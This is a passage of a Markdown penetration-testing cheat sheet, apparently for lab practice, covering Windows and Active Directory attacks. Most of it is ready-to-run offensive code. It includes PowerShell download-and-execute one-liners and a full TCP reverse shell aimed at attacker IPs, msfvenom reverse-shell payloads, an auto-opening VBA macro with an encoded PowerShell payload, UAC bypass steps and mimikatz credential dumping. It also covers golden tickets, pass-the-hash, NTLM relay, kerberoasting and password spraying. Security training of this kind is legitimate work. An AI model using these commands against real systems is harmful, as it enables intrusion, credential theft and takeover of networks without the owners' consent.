Get-FileHash -Algorithm MD5 file.txt
```

**Encode Base64**
```
$FileName = "C:\Users\Phineas\Desktop\Oracle issue.txt"
$data = Get-Content $Filename
$data_utf8 = [System.Text.Encoding]::UTF8.GetBytes($data)
[System.Convert]::ToBase64String($data_utf8)
```

## Reverse Shells
Download and execute with Powershell:
```
powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))"

c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
```

Powershell only:
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Privilege Escalation
### Switch to high integrity level
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

**Checklist:**
* [Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

**Process Monitoring:**
* [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)

### System Enumeration
```
systeminfo
hostname
tasklist
wmic qfe
wmic qfe get Caption, Description, HotFixID, InstalledOn
wmic logicaldisk get caption,description,providername
mountvol
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"} #get kernel modules and device drivers
driverquery /v # get drivers installed on system

# list services
wmic service get name,displayname,pathname,startmode
# look for services that were automatically started and not path c:\windows
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# get permissions on directory
icalcs "C:\Path"
```
Discover domain controller hostname
```
nslookup
set type=all
_ldap._tcp.dc._msdcs.sandbox.local
exit
```


### User Enumeration
```
whoami
whoami /priv
whoami /groups
net user 
net user /domain
net user Administrator
net user jim /domain
net group /domain
net localgroup
net localgroup Administrators
```

### Restart host
```
shutdown /r /t 0
```

### Start/Stop Service
First list with
```
wmic service get name,displayname,pathname,startmode
```
Then start/stop
```
net start ServiceName
net stop ServiceName
```

### Scheduled Tasks
```
schtasks /query /fo LIST /v
```

### Applications
Only shows application installed by windows installer
```
wmic product get name,version,vendor
```

### Network Enumeration
```
ipconfig
ipconfig /all
arp -a
route print
netstat -ano
```

### Password Hunting
```
findstr /si password *.txt *.ini *.config
```

### AV and FW Enumeration
```
sc query windefend
sc queryex type= service # Show all services
netsh advfirewall firewall dump
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
firewall show state
netsh firewall show config
```

### Update Windows Firewall
**SYSTEM privilege required**

Update Windows Firewall since incoming requests are most likely blocked
```
netsh advfirewall firewall add rule name="foward_port_rule" protocol=TCP dir=in localip=10.10.10.10 localport=4444 action=allow
```
Port Forward
```
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
```
Example: List SMB shares (from attacker machine, victim=10.10.10.10, hostToConnect=192.168.1.10)
```
smbclient -L 10.10.10.10 --port=4444
# mount share
sudo mount -t cifs -o port=4444 //10.10.10.10/Share -o username=Administrator,password=passwd! /mnt/share
```



### AutoElevate Binaries (SUID like)
First, on Windows systems, we should check the status of the AlwaysInstallElevated48 registry setting. If this key is enabled (set to 1) in either HKEY_CURRENT_USER or HKEY_LOCAL_MACHINE, any user can run Windows Installer packages with elevated privileges.

```
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
```

### UAC Bypass
Check integrity level with ``whoami /groups`` or ``whoami /all``

Using Powershell (GUI access needed for prompt)
```
powershell.exe Start-Process cmd.exe -Verb runAs
```

The following example uses C:\windows\system32\fodhelper.exe which is launched every time a user opens 'Manage optional features'
1. Use [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/) and sigcheck.exe to verify integrity level
```
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe /accepteula
```
2. Look for 'requestedExecutionLevel'(requireAdministrator) and 'autoElevate'(true)
3. Launch [Procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)
4. Filter by process name
5. Filter by Operation contains Reg
6. Filter for Result = "NAME NOT FOUND" to get registry hives that are accessed but not exist
7. Look for a registry hive that you have read and write access, e.g. HKEY_CURRENT_USER => Path contains HKCU
8. Find out what the application attempts to query
9. Look for other access to entries that contain same query (or part of it), if the process can successfully acces that key in some other hive, the results will provide us with more clues
10. Create according registry, e.g. ``REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command``
11. Find out what value fodhelper.exe attempts to query (DelegateExecute)
12. Add a DelegateExecute entry, leaving its value empty. If the application discovers this empty value it will hopefully follow the MSDN specification for application protocols and look for a program to launch
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
```
13. Replace "NAME NOT FOUND" filter with "SUCCESS"
14. Verify fodhelper.exe finds the new DelegateExecute entry
15. Replace the empty value with an executable (cmd.exe)
```
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
```

**Example Eventvwr.exe**
* see https://lolbas-project.github.io/lolbas/Binaries/Eventvwr/

Create reverse shell .exe file
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.134 LPORT=444 -f exe -o foobar.exe
```
Modify Registry
```
REG ADD HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Users\Public\Videos\foobar.exe" /f
```
Set up listener and run eventvwr.exe



### Automated Enumeration Tools
Download and run executable with simple bypass method (from cmd.exe)
```
echo IEX(New-Object System.Net.WebClient).DownloadString("http://10.10.14.23:8000/jaws-enum.ps1") | powershell -noprofile -
```
Download File
```
IEX(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.23:8000/nc.exe", "C:\test\nc.exe")
```

**Executables:**
* [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
* [winPEAS.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [Seatbelt.exe](https://github.com/GhostPack/Seatbelt)
* [Wason.exe](https://github.com/rasta-mouse/Watson)
* [SharpUp.exe](https://github.com/GhostPack/SharpUp)

**PowerShell Scripts:**
* [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) 
* [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock)
```
powershell -ep bypass
Import-Module .\Sherlock.ps1
Find-AllVulns
```
* [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [jaws-enum.ps1](https://github.com/411Hall/JAWS)

**Other Resources:**
* [exploit suggester (metasploit)](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
* [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
* [windows-exploit-suggester.py (local)](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
this script uses python2 which can lead to issues. create virtualenv and make sure you are using xlrd version 1.2.0
```
virtualenv -p /usr/bin/python2.7 venv
source venv/bin/activate
pip install xlrd==1.2.0
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2020-12-12-mssb.xls --systeminfo sysinfo.txt
```
* [Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Potato Attacks
Check if SeImpersonatePrivilege authentication is enabled with ``whoami /priv``
* [Rotten Potato](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
* [Juicy Potato](https://github.com/ohpe/juicy-potato)
```
C:\Users\Public\JuicyPotato.exe -t t -p C:\Users\Public\exe.exe -l 5837
```
## Active Directory

### Capturing NTLM Net-Hashes with Responder

:information_source: Default configuration in windows is always fall back to LLMNR if DNS resolving fails. LLMNR broadcasts its request to the whole network.

```sequence
Victim->DNS Server: Who is "fileservrr"
DNS Server->Victim: I don't know
Victim->Network: Anyone knows who "fileservrr" is?
Attacker->Victim: Yes, this is me
Victim->Attacker: I would like to log in
Attacker->Victim: OK, encrypt this challenge with your password hash
Victim->Attacker: Sends encrypted challenge
Attacker->Victim: Sorry, something went wrong
```

``` bash
responder -I eth0 -rdwv

[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 192.168.92.129
[SMB] NTLMv2-SSP Username : WHITEROSE\ealderson
[SMB] NTLMv2-SSP Hash     : ealderson::WHITEROSE:af77856ba3332f51:B81BF48A67FE909F054D588DF1345C6A:0101000000000000C0653150DE09D2012BC03559A3DFA755000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000F279BA7D9D36AB76937A31505A3A023E63ECAF17A4F311B0E248705A3CB09B9A0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00390032002E003100330033000000000000000000
```

### Crack NTLMv2 Net-Hashes with hashcat

1. Get module number of NTLM hash with 

   ``` bash
   hashcat --example-hashes | grep NTLM -C 4
   ```

2. Crack Hash

   ``` bash
   hashcat -m 5600 hashes.txt rockyou.txt 
   ```

### SMB Relay Attack

:warning: This does not work if SMB Signing is required. 

:warning: The relayed user needs to be a local administrator on target machine to dump the SAM hashes.

Disable SMB in ```/etc/responder/Responder.conf``` and run:

``` bash
responder -I eth0 -rdwv
```

Open a second terminal and run:

```
ntlmrelayx.py -tf targets.txt -smb2support
```

### LDAP Enumeration
```bash
# get base domain name with nmap
nmap -n -sV --script "ldap* and not brute" 10.10.10.161
nmap -p 389 --script ldap-rootdse -Pn 10.10.10.161
nmap -p 389 --script ldap-search -Pn 10.10.10.161

# get information
ldapsearch -x -h 10.10.10.161 -D '' -w '' -b "DC=htb,DC=local"  
```

### Password Spraying
* get the domain password policy first to check lockout policy
```bash
crackmapexec smb 10.10.10.161 --pass-pol
crackmapexec smb 10.10.10.161 -u userlist.txt -p pwlist.txt
crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt
crackmapexec smb 10.10.10.0/24 -u userlist.txt -p pwlist.txt --continue-on-success
```
* cracking considering lockout policy, see [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1)

### Shell Access with Credentials

:information_source: Start with smbexec.py and wmiexec.py due to psexec.py is more noisy and may trigger windows defender.
:information_source: If winrm port is open, see [evil-winrm](https://github.com/Hackplayers/evil-winrm)

``` bash
psexec.py whiterose.local/ealderson:Password!@192.168.92.129
impacket-psexec whiterose.local/ealderson:Password!@192.168.92.129
```

* https://github.com/Hackplayers/evil-winrm

* PowerShell
```
$dcsess = New-PSSession -Computer DCHOSTNAME
Invoke-Command -Session $dcsess -ScripBlock {ipconfig}
Copy-Item "C:\Users\Public\whoami.exe" -Destination "C:\Users\Public\" -ToSession $dcsesh
```

### Shell Access with Kerberos Ticket
Create a TGT Kerberos ticket first by issuing a command that requires domain permissions (net use \\dc01)
```
.\PsExec.exe \\dc01 cmd.exe
```

### IPv6 Attacks

:information_source: ​Only possible if IPv6 is enabled and no DNS Server is defined for IPv6. In this case we may get NTLM net-Hashes and can relay those to authenticate (see SMB Relay Attack). Details: 

[Combining NTLM Relaying and Kerberos Delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

[mitm6 - compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)

:information_source: Make sure mitm6 is installed. If not, install it with: ``` sudo pip3 install mitm6 ```

``` bash
mitm6 -d whiterose.local
```

Open a second terminal and run:

```
ntlmrelayx.py -6 -t ldaps://192.168.92.130 -wh fakewpad.whiterose.local -l outfile
```

:information_source: ``` --delegate-access ``` 


### Collect all Users with their Attributes
For more information about samAccountTypes see this [link](https://docs.microsoft.com/en-us/windows/win32/adschema/a-samaccounttype?redirectedfrom=MSDN)
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="samAccountType=805306368"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    Foreach($prop in $obj.Properties)
    {
        $prop
    }
    
    Write-Host "------------------------"
} 

```
### Resolving Nested Groups
Print names of all the groups
```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

$PDC = ($domainObj.PdcRoleOwner).Name

$SearchString = "LDAP://"

$SearchString += $PDC + "/"

$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

$SearchString += $DistinguishedName

$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

$objDomain = New-Object System.DirectoryServices.DirectoryEntry

$Searcher.SearchRoot = $objDomain

$Searcher.filter="(objectClass=Group)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.name
}

```
Assuming we found group XY. Replace the last 8 lines with:
```
$Searcher.filter="(name=XY)"

$Result = $Searcher.FindAll()

Foreach($obj in $Result)
{
    $obj.Properties.member
}
```
For finding domain joined services
```
.
..
$Searcher.filter="serviceprincipalname=*http*"
..
.
```

### PowerView

:information_source: [sourcecode](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

:information_source: [cheatsheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

1. Bypass execution policy

```
powershell -ep bypass
```

2. Use PowerView

```
. .\PowerView.ps1
Import-Module .\PowerView.ps1
```

3. Start enumerating. Examples:

```
Get-NetDomain
Get-NetDomainControllers
Get-DomainPolicy
{Get-DomainPolicy}."system access"
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select samaccountname
Get-UserProperty
Get-UserProperty -Properties pwdlastset
Get-NetComputer -FullData
Get-NetGroup
Get-NetGroupMember -GroupName "Domain Admin"
Invoke-ShareFinder
Get-NetGPO | select displayname, whenchanged
```

:information_source: Detect possible honey accounts with:

```
Get-UserProperty -Properties logoncount
```

Currently logged on Users
```
Get-NetLoggedon -ComputerName clientXY
Get-NetSession -ComputerName DC01
```

Get the domain's account policy. Specially helpful for bruteforce attacks => see lockout policy
```
net accounts
```
or using crackmapexec
```
crackmapexec <IP> -u 'user' -p 'password' --pass-pol
```

### Bloodhound

:information_source: [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1) 				

:information_source: [Data-Collector](https://github.com/BloodHoundAD/BloodHound/wiki/Data-Collector) 

On host run:

```
powershell -ep bypass
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain WHITEROSE.local -ZipFileName file.zip 
```

You can also use the .exe
```
.\SharpHound.exe -c all
```

Transfer the zip file to kali instance and load it into bloodhound to visualize.

:information_source: Install bloodhound using apt or download git repository
:information_source: bloodhound depends on neo4j so make sure it is installed
:information_source: good starting point are prebuild queries. see 'shortest path to high value targets'

Start NEO4j (user: neo4j)
```
sudo neo4j console
```
Start Bloodhound
```
bloodhound
```
Then import zip file

### Pass The Password

:information_source: install crackmapexec using apt
:information_source: keep lockout policy in mind

You can spray credentials in an AD network using crackmapexec:

```
crackmapexec smb 192.168.92.0/24 -u ealderson -d WHITEROSE.local -p Password123
```

### Dumping Hashes with secretsdump.py

:information_source: secretsdump.py is part of the impacket toolkit

```
secretsdump.py whiterose/ealderson:Password123@192.168.92.131
```

### Dumping SAM file 
```
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

### Pass The Hash
If you retreive the NTLM hash simply paste it as lmhash and nthash:
ntlm: 8c802621d2e36fc074345dded890f3e5 => 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5

Use NTHASH (LMHASH:NTHASH)

```
crackmapexec 192.168.92.0/24 -u "Elliot Alderson" -H 64f12cdda88057e06a81b54e73b949b --local
```

Alternative: [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
```
pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.10.10.22 cmd
```
Or 
```
psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
```
```
psexec.py -u "Elliot Alderson":@192.168.92.131 -hashes <lmhash:nthash>
psexec.py domain.local/Administrator@192.168.10.10 -hashes 8c802621d2e36fc074345dded890f3e5:8c802621d2e36fc074345dded890f3e5
```
Or
```
# Overpass the hash
mimikatz # sekurlsa::pth /user:user /domain:domain.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
PS C:\> net use \\dc01
PS C:\> .\psexec.exe \\dc01 cmd.exe
```

### Pass The Ticket (Silver Ticket)
The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required. (TGS offers more flexibility than TGT)

Example SID:
```
  S-1-5-21-2536614405-3629634762-1218571035-1116
  \_______________________________________/\___/
  S-<Revision Level>-<Identifier-Authority>-<Relative Identifier>
```
Use mimikatz to create a silver ticket.
To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.
```
mimikatz # kerberos::purge
mimikatz # kerberos::list
mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-1602875587-2787523311-2599479668 /target:ServicePrincipalName /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```
where /rc4 is the hash

### Lateral Movement with Distributed Component Object Model (DCOM) 
i: Requires access to TCP 135 for DCOM and TCP 445 for SMB. Relatively new vector. May avoid some detection system like EDR/NDR/AV.

The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.

Discover available methods from a DCOM object. In this example Excel.
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))

$com | Get-Member
```
This script revealed the 'Run' method which allows to execute Visual Basic for Applications (VBA) remotely
POC macro:
```
Sub mymacro()
    Shell ("notepad.exe")
End Sub
```
Save to an Excel file and copy to target
```
$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"

$RemotePath = "\\192.168.1.110\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
```
The Excel application is instantiated through DCOM with SYSTEM account. This account does not have a profile, which is used as part of the opening process.
To fix this, simply create the Desktop folder at ``C:\Windows\SysWOW64\config\systemprofile``
```
$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)
```
Call the 'Run' method on our Excel file
```
$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "10.10.10.10"))

$LocalPath = "C:\Users\dummy_admin.corp\myexcel.xls"

$RemotePath = "\\10.10.10.10\c$\myexcel.xls"

[System.IO.File]::Copy($LocalPath, $RemotePath, $True)

$Path = "\\10.10.10.10\c$\Windows\sysWOW64\config\systemprofile\Desktop"

$temp = [system.io.directory]::createDirectory($Path)

$Workbook = $com.Workbooks.Open("C:\myexcel.xls")

$com.Run("mymacro")
```


### Token Impersonation

Get a meterpreter session (e.g. smb/psexec).

```
meterpreter> load incognito
meterpreter> list tokens
meterpreter> impersonate_token marvel\\administrator
```

### Kerberoasting
Enumerate SPN's and request a service ticket. Decrypting ticket by brute forcing provides the password hash which can be cracked to retreive the password in clear text.

:information_source: GetUserSPNs.py is part of the impacket toolkit

**Kerberos in a nutshell:**
```sequence
User->Domain Controller: 1. Request TGT, Provide NTLM hash
Domain Controller->User: 2. Receive TGT enc. w. krbtgt hash
User->Domain Controller: 3. Request TGS for Server (Presents TGT)
Domain Controller->User: 4. Receive TGS enc. w. servers account hash
User->Application Server: 5. Presents TGS for service enc. w. servers account
Application Server->Domain Controller: (opt.) PAC Validation request
Domain Controller->Application Server: (opt.) PAC Validation response
```

**Get Kerberos Service Ticket by SPN:**
When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.


Powershell script:
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
```
List tickets with powershell:
```
klist
```
Or with mimikatz:
```
kerberos::list
kerberos::list /export
```

Or simply with Invoke-Kerberoast.ps1
```
Import Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.hash
```

**Cracking Service Ticket:**
Since the service ticket is encrypted with the service accounts password hash, we can bruteforce this with a wordlist
This is also possible with john the ripper or hashcat (which is a lot faster)
```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticket.kirbi 
```

If ticket is obtained with mimikatz ``kerberos::list /export``
```
kirbi2john ticket.kirbi > ticket.txt
john --wordlist=rockyou.txt ticket.txt

```

If Invoke-Kerberoast.ps1 used:
```
hashcat -m 13100 --force hash.hash /usr/share/wordlists/rockyou.txt
```

**Crack the servers account hash:**

```
GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
```

### cPassword / Group Policy Preferences (GPP) Attacks

:information_source: GPP's allowed admins to create policies using embedded credentials. These credentials were encrypted and placed in a 'cPassword'. The key was accidentally released. Patched with MS14-025 but does not prevent the previous uses. If the policy was set before this was patched. [Blogpost](https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/)

:information_source: Check if vulnerable with metasploit using smb_enum_gpp.

:information_source: You can test this attack using the retired machine 'Active' on HackTheBox

Get Groups.xml from SYSVOL or \Replication share and check for cPassword.

```
gpp-decrypt <cPassword-Hash>
```

### Mimikatz

[Github Page](https://github.com/gentilkiwi/mimikatz)

:information_source: Tool used to view and steal credentials, generate kerberos tickets, leverage attacks and dump credentials stored in memory. Not working every time due to cat and mouse game between developers and windows.

**Dump Hashes:**

Run mimikatz on DC and run the following commands to dump hashes.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam 
mimikatz # lsadump::sam /patch
mimikatz # lsadump::lsa /patch
mimikatz # lsadump::dcsync /user:Administrator # domain admin privilege needed, triggers domain controller synchronization (NTDS.dit)
```

In case you do not have a proper shell try:
```
.\mimikatz "sekurlsa::logonpasswords" exit
```

### Golden Ticket Attack
When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt. By getting the krbtgt password hash one is able to create custom TGTs (golden tickets)

```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt 
# look for NTLM hash for User krbtgt
```

Copy S-ID of the domain and NTLM hash of TGT-Account.

```
mimikatz # kerberos::golden /User:Administrator /domain:whiterose.local /sid:S-1-5-21-301242389-3840584950-2384549833 /krbtgt:64f12cdda88057e06a81b54e73b949b /id:500 /ptt
mimikatz # misc::cmd # to launch new command prompt

> psexec.exe \\dc01 cmd.exe
```
:information_source: Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication. If we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked. Therefore the following would not work!
```
> psexec.exe \\10.10.10.100 cmd.exe
```

## Client Side Attacks
### HTML Applications
If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically interpret it as a HTML Application and offer the ability to execute it using the mshta.exe program

POC: 
```
<html>
<body>

<script>

  var c= 'powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC...d7Ks'; 
  new ActiveXObject('WScript.Shell').Run(c);
  
</script>

</body>
</html>
```
Craft payload
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o payload.hta
```

### Exploiting Microsoft Office
Create payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta
```
Since VBA has a 255-character limit for literal strings we need to split the command we want to execute into multiple lines
```
str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC....."

n = 50

for i in range(0, len(str), n):
	print "Str = Str + " + '"' + str[i:i+n] + '"'
```
VBA macro:
```
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
    Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
    Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
    Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
    Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
    Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
    ...
    Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
    Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
    Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
    Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
    Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
    Str = Str + "QA="

    CreateObject("Wscript.Shell").Run Str
End Sub
```

## Port Redirection and Tunneling
### Plink
* [plink](http://the.earth.li/~sgtatham/putty/0.53b/htmldoc/Chapter7.html)
```
plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.1:3306 10.10.10.10
# avoid prompt 'Store key in cache?'
cmd.exe /c echo y | plink.exe -ssh -l username -pw password -R 10.10.10.10:4444:127.0.0.0:3306 10.10.10.10
```

### netsh
```
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=10.10.10.10 connectport=445 connectaddress=192.168.1.10
```
### HTTPTunneling Through Deep Packet Inspection
* [HTTPTunnel](http://http-tunnel.sourceforge.net/)

Assuming the following setup:

Attacker Machine (Kali): 10.10.10.10
Compromised Machine: 10.10.10.20, additional interface to 192.168.1.0/24
Windows Server: 192.168.1.100
Firewall incoming traffic to ports 80,443 and 4444 (misconfigured)
Objective: Get a RDP Session to the Windows Server

1. Setup local forward on compromised machine
```
ssh -L 0.0.0.0:8888:192.168.1.100:3389
```
2. Setup HTTPTunnel server on compromised machine (hts)
```
hts --foward-port localhost:8888 4444
```
3. Setup HTTPTunnel client on attacker machine
```
htc --forward-port 8080 10.10.10.10:4444
```
4. Connect with a RDP tool to 127.0.0.1:8080 (attacker machine)


# Protocols
## SMTP
### Enumerate users
```
nc -nv 10.10.10.10 25
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 <idontexist>: Recipient address rejected: User unknown in local 
```

### Extract Mails from Server using Telnet (Authenticated, IMAP)
```
telnet <IP or Hostname> 143
a1 LOGIN <username> <password>
a2 LIST '' '\*'
a3 EXAMINE INBOX
a4 FETCH 1 BODY[]
a5 FETCH 2 BODY[]
```

## DNS
### Basic Examples
```
host domain.com
host -t mx domain.com
host -t txt domain.com
host -t ns domain.com
host 10.10.10.10
```

### DNS Recon
``` bash
dnsrecon -r 127.0.0.1/24 -n <IP of DNS Server>
dnsrecon -d domain -t axfr # zone transfer
dnsrecon -d domain -D ~/list.txt -t brt # bruteforce subdomains

# check with nmap what IP listen on port 53, then try one after another and specify it with -n
dnsrecon -r 192.168.175.0/24 -n 192.168.175.149
```

**query dns server with nslookup:**
```
nslookup
# set dns server
> server 10.10.10.13                                                                                                                                                     
Default server: 10.10.10.13
Address: 10.10.10.13#53               
# lookup ip
> 10.10.10.13                        
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb
```

### DNSenum
```
dnsenum zonetransfer.me
```

### Zone transfer
**Dig:**
```
[16:18:50]-[kali@kali]-[~/hackthebox/boxes/cronos] » dig axfr cronos.htb @ns1.cronos.htb                                                                            10 ↵

; <<>> DiG 9.16.6-Debian <<>> axfr cronos.htb @ns1.cronos.htb
;; global options: +cmd
cronos.htb.             604800  IN      SOA     cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.             604800  IN      NS      ns1.cronos.htb.
cronos.htb.             604800  IN      A       10.10.10.13
admin.cronos.htb.       604800  IN      A       10.10.10.13
ns1.cronos.htb.         604800  IN      A       10.10.10.13
